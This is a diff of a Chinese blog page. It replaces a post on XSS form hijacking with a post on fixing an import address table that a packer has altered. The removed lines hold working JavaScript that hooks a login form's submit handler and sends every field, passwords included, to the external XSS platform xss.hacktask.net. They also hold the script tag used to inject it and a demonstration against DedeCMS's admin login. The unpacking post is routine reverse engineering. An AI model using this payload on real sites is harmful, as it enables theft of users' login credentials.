@@ -4,34 +4,46 @@
 <head>
   <meta charset="UTF-8">
   
-    <title>表单劫持 | dw的博客</title>
+    <title>IAT被壳修改如何修复IAT | dw的博客</title>
     <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
     
     <meta name="author" content="dw">
     
 
     
-    <meta name="description" content="今天看到了表单劫持,于是想在XSS平台上创建一个表单劫持的项目,使用的平台是http://xss.hacktask.net/ 
+    <meta name="description" content="很多比较鸡贼的壳都会修改程序的IAT,这里说的修改不是指加壳以后的修改(加壳以后几乎所有的壳都会重建程序的IAT),而是指程序到达真正的OEP以后,发现IAT表中很多函数指到了别的地方,导致ImportRec无法修复.
+原理
+加壳程序要保证原程序能够正常运行,必须在程序到达真正的OEP之前将程序的IAT恢复出来,这里说的恢复有下面两种情况:
 
-在网上找了一下表单劫持方面的资料,思路大多是配合xss.js公共模块,通过修改form表单里action的地址为自己提供的地址,比如说http://www.xxxx.com/Form.php ,然后在From.php中,解析$_POST的内容达到劫持表单的功能.有兴趣的">
+
+1.原封不动的恢复
+2.修改原IAT表中的项,让他指">
 <meta property="og:type" content="article">
-<meta property="og:title" content="表单劫持">
-<meta property="og:url" content="http://yoursite.com/2015/04/29/表单劫持/index.html">
+<meta property="og:title" content="IAT被壳修改如何修复IAT">
+<meta property="og:url" content="http://yoursite.com/2015/05/12/IAT被壳修改如何修复IAT/index.html">
 <meta property="og:site_name" content="dw的博客">
-<meta property="og:description" content="今天看到了表单劫持,于是想在XSS平台上创建一个表单劫持的项目,使用的平台是http://xss.hacktask.net/ 
+<meta property="og:description" content="很多比较鸡贼的壳都会修改程序的IAT,这里说的修改不是指加壳以后的修改(加壳以后几乎所有的壳都会重建程序的IAT),而是指程序到达真正的OEP以后,发现IAT表中很多函数指到了别的地方,导致ImportRec无法修复.
+原理
+加壳程序要保证原程序能够正常运行,必须在程序到达真正的OEP之前将程序的IAT恢复出来,这里说的恢复有下面两种情况:
 
-在网上找了一下表单劫持方面的资料,思路大多是配合xss.js公共模块,通过修改form表单里action的地址为自己提供的地址,比如说http://www.xxxx.com/Form.php ,然后在From.php中,解析$_POST的内容达到劫持表单的功能.有兴趣的">
-<meta property="og:image" content="/img/blog_img/4月/表单劫持/1.png">
-<meta property="og:image" content="/img/blog_img/4月/表单劫持/2.png">
-<meta property="og:image" content="/img/blog_img/4月/表单劫持/3.png">
-<meta property="og:image" content="/img/blog_img/4月/表单劫持/4.png">
-<meta property="og:image" content="/img/blog_img/4月/表单劫持/5.png">
-<meta property="og:image" content="/img/blog_img/4月/表单劫持/6.png">
+
+1.原封不动的恢复
+2.修改原IAT表中的项,让他指">
+<meta property="og:image" content="/img/blog_img/5月/IAT被壳修改如何修复IAT/1.png">
+<meta property="og:image" content="/img/blog_img/5月/IAT被壳修改如何修复IAT/2.png">
+<meta property="og:image" content="/img/blog_img/5月/IAT被壳修改如何修复IAT/3.png">
+<meta property="og:image" content="/img/blog_img/5月/IAT被壳修改如何修复IAT/4.png">
+<meta property="og:image" content="/img/blog_img/5月/IAT被壳修改如何修复IAT/5.png">
+<meta property="og:image" content="/img/blog_img/5月/IAT被壳修改如何修复IAT/6.png">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="表单劫持">
-<meta name="twitter:description" content="今天看到了表单劫持,于是想在XSS平台上创建一个表单劫持的项目,使用的平台是http://xss.hacktask.net/ 
+<meta name="twitter:title" content="IAT被壳修改如何修复IAT">
+<meta name="twitter:description" content="很多比较鸡贼的壳都会修改程序的IAT,这里说的修改不是指加壳以后的修改(加壳以后几乎所有的壳都会重建程序的IAT),而是指程序到达真正的OEP以后,发现IAT表中很多函数指到了别的地方,导致ImportRec无法修复.
+原理
+加壳程序要保证原程序能够正常运行,必须在程序到达真正的OEP之前将程序的IAT恢复出来,这里说的恢复有下面两种情况:
 
-在网上找了一下表单劫持方面的资料,思路大多是配合xss.js公共模块,通过修改form表单里action的地址为自己提供的地址,比如说http://www.xxxx.com/Form.php ,然后在From.php中,解析$_POST的内容达到劫持表单的功能.有兴趣的">
+
+1.原封不动的恢复
+2.修改原IAT表中的项,让他指">
 
     
     <link rel="alternative" href="/atom.xml" title="dw的博客" type="application/atom+xml">
@@ -90,14 +102,14 @@
 		<header class="article-info clearfix">
   <h1 itemprop="name">
     
-      <a href="/2015/04/29/表单劫持/" title="表单劫持" itemprop="url">表单劫持</a>
+      <a href="/2015/05/12/IAT被壳修改如何修复IAT/" title="IAT被壳修改如何修复IAT" itemprop="url">IAT被壳修改如何修复IAT</a>
   </h1>
   <p class="article-author">By
        
 		<a href="/about" title="dw" target="_blank" itemprop="author">dw</a>
 		
   <p class="article-time">
-    <time datetime="2015-04-29T02:22:11.000Z" itemprop="datePublished"> 发表于 2015-04-29</time>
+    <time datetime="2015-05-12T09:21:26.000Z" itemprop="datePublished"> 发表于 2015-05-12</time>
     
   </p>
 </header>
@@ -106,73 +118,65 @@
 		<div id="toc" class="toc-article">
 			<strong class="toc-title">文章目录</strong>
 		
-			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#思路"><span class="toc-number">1.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#模块配置"><span class="toc-number">2.</span> <span class="toc-text">模块配置</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#演示"><span class="toc-number">3.</span> <span class="toc-text">演示</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#缺点"><span class="toc-number">4.</span> <span class="toc-text">缺点</span></a></li></ol>
+			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#原理"><span class="toc-number">1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#过程"><span class="toc-number">2.</span> <span class="toc-text">过程</span></a></li></ol>
 		
 		</div>
 		
-		<pre><code>今天看到了表单劫持,于是想在XSS平台上创建一个表单劫持的项目,使用的平台是<span class="string">http:</span><span class="comment">//xss.hacktask.net/ </span>
-</code></pre><blockquote>
-<p>在网上找了一下表单劫持方面的资料,思路<font color="red">大多是配合xss.js公共模块,通过修改form表单里action的地址为自己提供的地址,比如说<a href="http://www.xxxx.com/Form.php" target="_blank" rel="external">http://www.xxxx.com/Form.php</a> ,然后在From.php中,解析$_POST的内容达到劫持表单的功能.</font>有兴趣的朋友自己搜索下,这里主要介绍使用Javascript进行表单劫持,这种方法的<font color="blue">缺点会在后面给出.</font></p>
+		<pre><code>很多比较鸡贼的壳都会修改程序的<span class="variable">IAT</span>,这里说的修改不是指加壳以后的修改(加壳以后几乎所有的壳都会重建程序的<span class="variable">IAT</span>),而是指程序到达真正的<span class="variable">OEP</span>以后,发现<span class="variable">IAT</span>表中很多函数指到了别的地方,导致<span class="variable">ImportRec</span>无法修复.
+</code></pre><h1 id="原理">原理</h1><blockquote>
+<p>加壳程序要保证原程序能够正常运行,必须在程序到达真正的OEP之前将程序的IAT恢复出来,这里说的恢复有下面两种情况:</p>
 </blockquote>
-<h1 id="思路">思路</h1><blockquote>
-<p>大家都知道,在提交form表单时会调用onsubmit方法,既然调用了onsubmit,说明表单中该填的项肯定都已经填好了,这时,我们通过修改onsubmit方法,便可以获取表单中的信息,代码如下:</p>
-</blockquote>
-<figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var <span class="keyword">str</span>=<span class="string">''</span>;</span><br><span class="line"><span class="keyword">for</span>(var i=<span class="number">0</span>;i&lt;f.elements.length;i++) <span class="comment">//逐个获取表单的名称以及值</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">str</span>+=f.elements[i].name+<span class="string">':'</span>+f.elements[i].value+<span class="string">'||'</span>; <span class="comment">//'||'为分隔符</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">str</span>=<span class="keyword">str</span>.substr(<span class="number">0</span>,<span class="keyword">str</span>.length-<span class="number">2</span>);</span><br><span class="line">var img=<span class="keyword">new</span> Image(); <span class="comment">//使用Image提交信息</span></span><br><span class="line">img.src=<span class="string">'http://xss.hacktask.net/index.php?do=api&amp;id=&#123;projectId&#125;&amp;data='</span>+escape(<span class="keyword">str</span>)+<span class="string">'&amp;url='</span>+escape(location.href); <span class="comment">//&#123;projectId&#125;为XSS平台为你分配的id</span></span><br><span class="line">func(event); <span class="comment">//func保存之前的onsubmit方法,由于这里面可能需要执行类似编码等操作,所以这里不能直接跳过</span></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br></pre></td></tr></table></figure>
-<h1 id="模块配置">模块配置</h1><ul>
-<li>首先在XSS平台中创建一个新的模块,模块名称和描述自己填吧,需要配置的是参数,配置参数,以及代码<center><br>  <img src="/img/blog_img/4月/表单劫持/1.png"><br></center>
-
-</li>
+<ul>
+<li>1.原封不动的恢复</li>
+<li>2.修改原IAT表中的项,让他指向一个新的函数,这个函数实现了原导入函数相似的功能.</li>
 </ul>
 <blockquote>
-<p>在底下的代码框写入我们的代码,就OK了</p>
+<p>第一种就不多说了,直接上ImportREC搞定,至于第二种,可以使用如下方法:<br>我们知道,程序在加载IAT时,需要从相应的DLL中读出指定的函数,我们就可以从这里入手,因为上面两种情况都会执行这个步骤.当IAT加载代码从DLL中读出原函数以后,是不是要<font color="red">经过相应的处理,变化,然后把得到的结果放到IAT对应的项中?</font>我们的目的就是<font color="red">阻止这些修改!</font></p>
 </blockquote>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> f=<span class="built_in">document</span>.forms[<span class="string">'&#123;set.formname&#125;'</span>];</span><br><span class="line"><span class="keyword">if</span>(f==<span class="literal">undefined</span>)</span><br><span class="line">&#123;</span><br><span class="line">        f=<span class="built_in">document</span>.getElementById(<span class="string">'&#123;set.formid&#125;'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> func=f.onsubmit;</span><br><span class="line">f.onsubmit=<span class="function"><span class="keyword">function</span><span class="params">(event)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="keyword">var</span> str=<span class="string">''</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;f.elements.length;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		str+=f.elements[i].name+<span class="string">':'</span>+f.elements[i].value+<span class="string">'||'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	str=str.substr(<span class="number">0</span>,str.length-<span class="number">2</span>);</span><br><span class="line">	<span class="keyword">var</span> img=<span class="keyword">new</span> Image();</span><br><span class="line">	img.src=<span class="string">'http://xss.hacktask.net/index.php?do=api&amp;id=&#123;projectId&#125;&amp;data='</span>+<span class="built_in">escape</span>(str)+<span class="string">'&amp;url='</span>+<span class="built_in">escape</span>(location.href);</span><br><span class="line">	func(event);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="过程">过程</h1><blockquote>
+<p>不同的壳情况当然也不一样,我们这里使用一个加壳的记事本程序,PEID没查到壳,不要紧,方法都是通用的</p>
+</blockquote>
+<p><strong><font color="GREEN" size="5">这种方法需要先脱壳,脱壳就不说了,直接在代码段下断,然后单步跟踪,很容易找到OEP</font></strong></p>
 <blockquote>
-<p>点击配置，完成</p>
+<p>找到OEP后,LoadPE转储,ImportRec修复,找到修复无效指针直接剪贴,常规流程!但是,剪贴以后傻逼了,直接成下面这样了</p>
 </blockquote>
-<h1 id="演示">演示</h1><blockquote>
-<p>这里以织梦为例,在后台那查看代码</p>
-</blockquote>
-<center><br>    <img src="/img/blog_img/4月/表单劫持/2.png"><br></center>
-
-<blockquote>
-<p>然后在XSS中新建一个项目,项目名称,描述,惯例随便写,选中我们自建的模块,formname写成form1,保存.<br>复制XSS代码(如果不知道怎么做的话自行百度XSS平台使用),我这里是</p>
-</blockquote>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">script</span> <span class="attribute">src</span>=<span class="value">http:</span>//<span class="attribute">xss.hacktask.net</span>/<span class="attribute">9D1Q9Z</span>?<span class="attribute">1430276699</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>织梦平台上模拟XSS插入</p>
-<center><br>    <img src="/img/blog_img/4月/表单劫持/3.png"><br></center>
+<center><br>    <img src="/img/blog_img/5月/IAT被壳修改如何修复IAT/1.png"><br></center>
 
 <blockquote>
-<p>这里操作就完成了,返回登录界面,随便登录一下</p>
-<p>熟悉的界面</p>
+<p>一个程序只导入了12个函数,可能吗?我只能说,可能性不大<br>再看看内存镜像里面的IAT,万一ImportRec把IAT的偏移或者大小计算错了呢?这种情况经常发生!</p>
 </blockquote>
-<center><br>    <img src="/img/blog_img/4月/表单劫持/4.png"><br></center>
+<p>查看内存镜像,如下图</p>
+<center><br>    <img src="/img/blog_img/5月/IAT被壳修改如何修复IAT/2.png"><br></center>
 
-<p>在XSS平台上看一下</p>
-<center><br>    <img src="/img/blog_img/4月/表单劫持/5.png"><br></center>
+<p>看来ImportRec没有出错,另外,可以看到,IAT里面有很多非DLL导出函数指针,这个应该就是壳修改以后的函数指针了,随便找一个位置(最好不要找第一个,这样可以有个参考),设置内存写入断点,看它是怎么写的.点了几次以后,内存镜像和中断位置如下</p>
+<center><br>    <img src="/img/blog_img/5月/IAT被壳修改如何修复IAT/3.png"><br></center>
 
+<center><br>    <img src="/img/blog_img/5月/IAT被壳修改如何修复IAT/4.png"><br></center>
+
+<p>看来<font color="red">ECX</font>存储的是函数指针,而上面又有<font color="red">MOV ECX,DWORD PTR SS:[EBP+40D456]</font>,所以直接找<font color="red">DWORD PTR SS:[EBP+40D456]</font>.</p>
+<center><br>    <img src="/img/blog_img/5月/IAT被壳修改如何修复IAT/5.png"><br></center>
+
+<p>这里,记住这个位置,重新开始,在40d400下断.发现这里如果把JE改成JMP的话可以跳过刚才的代码,试下.</p>
 <blockquote>
-<p>截获到了吧,看下内容</p>
+<p>重新来到OEP,现在在看看IAT</p>
 </blockquote>
-<center><br>    <img src="/img/blog_img/4月/表单劫持/6.png"><br></center>
+<center><br>    <img src="/img/blog_img/5月/IAT被壳修改如何修复IAT/6.png"><br></center>
 
-<h1 id="缺点">缺点</h1><blockquote>
-<p>看到这里,缺点大家应该也知道了,在输入的时候不管你的用户名密码是否正确,都会上传到XSS平台,也就是说,你截获到的账号密码不一定是正确的</p>
-</blockquote>
-<font size="30" color="green">祝大家好运^-^</font>  
+<p>妥妥的!</p>
+  
 	</div>
 		<footer class="article-footer clearfix">
 <div class="article-catetags">
 
 <div class="article-categories">
   <span></span>
-  <a class="article-category-link" href="/categories/hack/">hack</a>
+  <a class="article-category-link" href="/categories/逆向工程/">逆向工程</a>
 </div>
 
 
   <div class="article-tags">
   
-  <span></span> <a href="/tags/hack/">hack</a><a href="/tags/js/">js</a><a href="/tags/表单劫持/">表单劫持</a>
+  <span></span> <a href="/tags/脱壳/">脱壳</a><a href="/tags/逆向工程/">逆向工程</a>
   </div>
 
 </div>
@@ -181,7 +185,7 @@
 
 	<div class="article-share" id="share">
 	
-	  <div data-url="http://yoursite.com/2015/04/29/表单劫持/" data-title="表单劫持 | dw的博客" data-tsina="null" class="share clearfix">
+	  <div data-url="http://yoursite.com/2015/05/12/IAT被壳修改如何修复IAT/" data-title="IAT被壳修改如何修复IAT | dw的博客" data-tsina="null" class="share clearfix">
 	  </div>
 	
 	</div>
@@ -194,19 +198,11 @@
 	
 <nav class="article-nav clearfix">
  
- <div class="prev" >
- <a href="/2015/05/02/OD消息断点/" title="OD消息断点">
-  <strong>上一篇：</strong><br/>
-  <span>
-  OD消息断点</span>
-</a>
-</div>
-
 
 <div class="next">
-<a href="/2015/04/28/hexo-github无域名安装/"  title="windows下hexo-github无域名安装">
+<a href="/2015/05/12/利用管道自写shell/"  title="利用管道自写shell">
  <strong>下一篇：</strong><br/> 
- <span>windows下hexo-github无域名安装
+ <span>利用管道自写shell
 </span>
 </a>
 </div>
@@ -215,7 +211,7 @@
 
 	
 <section id="comments" class="comment">
-	<div class="ds-thread" data-thread-key="2015/04/29/表单劫持/" data-title="表单劫持" data-url="http://yoursite.com/2015/04/29/表单劫持/"></div>
+	<div class="ds-thread" data-thread-key="2015/05/12/IAT被壳修改如何修复IAT/" data-title="IAT被壳修改如何修复IAT" data-url="http://yoursite.com/2015/05/12/IAT被壳修改如何修复IAT/"></div>
 </section>
 
 
@@ -225,7 +221,7 @@
   <div id="toc" class="toc-aside">
   <strong class="toc-title">文章目录</strong>
  
- <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#思路"><span class="toc-number">1.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#模块配置"><span class="toc-number">2.</span> <span class="toc-text">模块配置</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#演示"><span class="toc-number">3.</span> <span class="toc-text">演示</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#缺点"><span class="toc-number">4.</span> <span class="toc-text">缺点</span></a></li></ol>
+ <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#原理"><span class="toc-number">1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#过程"><span class="toc-number">2.</span> <span class="toc-text">过程</span></a></li></ol>
  
   </div>
 
